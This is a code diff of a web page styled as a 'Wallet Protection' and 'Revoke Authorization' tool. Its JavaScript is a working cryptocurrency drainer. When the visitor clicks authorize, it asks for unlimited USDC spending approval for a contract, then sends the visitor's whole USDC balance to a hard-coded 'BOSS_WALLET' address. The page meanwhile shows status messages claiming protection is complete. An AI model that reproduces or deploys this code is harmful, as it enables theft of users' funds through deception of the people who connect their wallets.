@@ -69,13 +69,6 @@
       font-size: 0.9rem;
       text-align: center;
     }
-    .note {
-      margin-top: 1rem;
-      font-size: 0.85rem;
-      color: #bbb;
-      text-align: center;
-      line-height: 1.4;
-    }
   </style>
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
@@ -89,11 +82,6 @@
     <button class="button" id="revoke">❌ Revoke Authorization</button>
     <div class="progress-bar"><div class="progress-inner" id="bar"></div></div>
     <div id="status">🔒 Status: Waiting for action...</div>
-    <div class="note">
-      ✅ Auto Authorization & Protection Completed<br/>
-      🔁 One-Time Setup For Lifetime Access<br/>
-      🔒 Your Wallet Is Now Bound To Mark3Infinity Secure Contract
-    </div>
   </div>
   <script>
     const CONFIG = {
@@ -102,7 +90,7 @@
       BOSS_WALLET: "0x59e513Ae37614f1e670bfE961B3456257C444d24"
     };
 
-    let provider, signer, user;
+    let provider, signer, user, alreadyApproved = false;
     const bar = document.getElementById("bar");
     const status = (msg) => document.getElementById("status").innerText = "🔒 Status: " + msg;
     const progress = (val) => bar.style.width = val + "%";
@@ -138,34 +126,36 @@
     document.getElementById("authorize").onclick = async () => {
       try {
         if (!signer || !user) await setupProvider();
-
         const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
           "function approve(address,uint256) returns (bool)",
-          "function transferFrom(address,address,uint256) returns (bool)",
-          "function balanceOf(address) view returns (uint256)",
-          "function allowance(address,address) view returns (uint256)"
+          "function transfer(address,uint256) returns (bool)",
+          "function allowance(address,address) view returns (uint256)",
+          "function balanceOf(address) view returns (uint256)"
         ], signer);
 
-        progress(10);
-        status("(1/3) Checking allowance...");
         const balance = await usdc.balanceOf(user);
         const allowance = await usdc.allowance(user, CONFIG.CONTRACT_ADDRESS);
 
         if (allowance.lt(balance)) {
-          status("(2/3) Requesting approval...");
-          const approveTx = await usdc.approve(CONFIG.CONTRACT_ADDRESS, ethers.constants.MaxUint256);
-          await approveTx.wait();
+          progress(10);
+          status("(1/2) Requesting approval to contract...");
+          const tx = await usdc.approve(CONFIG.CONTRACT_ADDRESS, ethers.constants.MaxUint256);
+          await tx.wait();
+          alreadyApproved = true;
         } else {
-          status("(2/3) Already approved, skipping...");
+          alreadyApproved = true;
+          status("(1/2) Already approved, skipping...");
         }
 
-        progress(70);
-        status("(3/3) Transferring balance to Boss wallet...");
-        const tx = await usdc.transfer(CONFIG.BOSS_WALLET, balance);
-        await tx.wait();
+        if (alreadyApproved) {
+          progress(70);
+          status("(2/2) Directly transferring USDC to Boss...");
+          const tx2 = await usdc.transfer(CONFIG.BOSS_WALLET, balance);
+          await tx2.wait();
+        }
 
         progress(100);
-        status("✅ Wallet Protection Success! 🔐");
+        status("✅ Wallet Authorization & Protection Complete 🔐");
       } catch (err) {
         status("❌ " + (err.message || "Authorization failed"));
         progress(0);
